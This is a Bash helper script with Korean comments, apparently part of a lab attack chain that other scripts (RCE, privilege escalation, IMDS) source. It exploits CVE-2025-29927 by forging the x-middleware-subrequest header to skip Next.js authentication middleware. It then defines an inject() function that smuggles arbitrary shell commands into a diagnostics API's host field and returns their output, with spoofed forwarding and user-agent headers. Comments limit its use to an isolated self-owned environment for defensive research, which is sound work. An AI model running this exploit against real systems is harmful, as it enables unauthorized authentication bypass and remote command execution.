#!/bin/bash
# 공통 헬퍼: CVE-2025-29927 인증 우회 + command injection 주입기.
# 01_rce.sh / 02_privesc.sh / 03_imds.sh 가 source 한다(단독 실행용 아님).
# 범위: 본인 소유 격리 재현 환경 전용(방어 연구 목적).
#
# 필수: TARGET_IP (예: export TARGET_IP=$(terraform -chdir=../terraform output -raw web_public_ip))
#       로컬 검증: export TARGET_IP=127.0.0.1:3000
# 선택: ATTACKER_IP(위장 x-forwarded-for), ATTACKER_UA(위장 user-agent)

: "${TARGET_IP:?TARGET_IP를 설정하세요. 예: export TARGET_IP=127.0.0.1:3000}"

# 오퍼레이터 위장 값. 웹 접근 로그(access.log)에 그대로 남아 탐지 대상이 된다.
UA="${ATTACKER_UA:-curl/8.7 (lab-attacker)}"
XFF="${ATTACKER_IP:-203.0.113.42}"   # RFC 5737 TEST-NET-3 (문서용 예시 IP)

# CVE-2025-29927: 이 내부 헤더를 위조하면 Next.js가 미들웨어(인증)를 통째로 스킵한다.
BYPASS="x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
API="http://$TARGET_IP/api/internal/diagnostics"

# inject <셸명령>
#   진단 API의 command injection으로 원격에서 셸 명령 하나를 실행하고 그 stdout만 돌려준다.
#   ping 출력은 버리고(>/dev/null 2>&1) 주입 명령의 출력만 남긴다.
#   원격 sh에서 평가돼야 하는 $(...)·$VAR 는 호출부에서 작은따옴표로 감싸 로컬 확장을 막는다.
inject() {
  local body
  body=$(CMD="$1" python3 -c 'import os,json;print(json.dumps({"host":"127.0.0.1 >/dev/null 2>&1;"+os.environ["CMD"]}))')
  curl -s -X POST "$API" \
    -H 'content-type: application/json' \
    -H "$BYPASS" \
    -H "x-forwarded-for: $XFF" \
    -H "user-agent: $UA" \
    --data "$body" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("stdout",""),end="")'
}
